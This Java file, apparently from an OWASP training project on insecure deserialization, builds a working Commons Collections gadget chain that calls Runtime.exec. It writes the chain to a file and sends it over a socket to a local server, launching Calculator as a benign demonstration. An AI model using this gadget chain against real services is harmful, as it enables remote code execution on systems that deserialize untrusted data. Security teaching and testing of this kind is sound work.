package com.doku.doku_owasp_example.insecure_deserialization;

import lombok.extern.slf4j.Slf4j;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

/**
 * Sample Doku code that using Serialization:
 * - https://gerrit.doku.com/gitweb?p=cm-mib-jenius-connector.git;a=blob;f=src/main/java/doku/mib/jenius/Processor.java;h=ea6d2099c02cfa09c570c3c329400d0f4bc37318;hb=refs/heads/master#l49
 *
 * @author Daniel Joi Partogi Hutapea
 */
@SuppressWarnings({"unchecked", "rawtypes", "unused", "UnnecessaryLocalVariable", "JavadocLinkAsPlainText"})
@Slf4j
public class Simulation2GeneratePayload
{
    public static void main(String[] args) throws Exception
    {
        //serialize();
        //deserialize();
        sendMaliciousPayload();
    }

    private static Map createMaliciousPayload()
    {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer<>(Runtime.class),
            new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"}),
//            new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"touch /home/3000/delete-me-%s.txt".formatted(System.currentTimeMillis())}),
            //new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"/Users/daniel/Downloads/create-dummy-file.sh"}),
            new ConstantTransformer<>(Runtime.class)
        };

        Transformer tChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap<>();
        innerMap.put("key", "value");
        Map outerMap = TransformedMap.transformedMap(innerMap, null, tChain);

        //Map.Entry e = (Map.Entry) outerMap.entrySet().iterator().next();
        //e.getValue();

        return outerMap;
    }

    private static void serialize()
    {
        try
        {
            Map maliciousPayload = createMaliciousPayload();

            FileOutputStream fileOut = new FileOutputStream("/tmp/insecure-deserialization.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(maliciousPayload);
            out.close();
            fileOut.close();
        }
        catch (Exception ex)
        {
            log.error("Error occurred.", ex);
        }
    }

    @SuppressWarnings("rawtypes")
    private static void deserialize()
    {
        try
        {
            FileInputStream fis = new FileInputStream("/tmp/insecure-deserialization.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            Object o = ois.readObject();

            Map m = (Map) o;
            //Map.Entry e = (Map.Entry) m.entrySet().iterator().next();
            //e.setValue("Setting this trigger transformer to be executed.");
            m.put("key", "Malicious code will be executed if this line is executed.");

            log.info("Class: {}", o.getClass());
            System.out.println(o.getClass());
        } catch (Exception ex)
        {
            log.error("Error occurred.", ex);
        }
    }

    public static void sendMaliciousPayload() throws IOException
    {
        Socket clientSocket = new Socket("127.0.0.1", 8915);
        ObjectOutputStream outToServer = new ObjectOutputStream(clientSocket.getOutputStream());
        outToServer.writeObject(createMaliciousPayload());
        outToServer.flush();
        clientSocket.close();
    }
}
